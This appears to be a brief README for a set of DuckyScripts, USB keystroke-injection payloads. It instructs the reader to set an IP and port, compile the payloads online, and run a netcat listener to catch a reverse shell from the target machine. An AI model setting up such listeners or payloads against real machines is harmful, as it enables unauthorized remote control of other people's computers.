#DuckyScripts

Make sure you change the ip and port values before compiling using https://payloadstudio.com/community/

Run the below command server side to catch shell
stty raw -echo; (stty size; cat) | nc -lvnp <port>
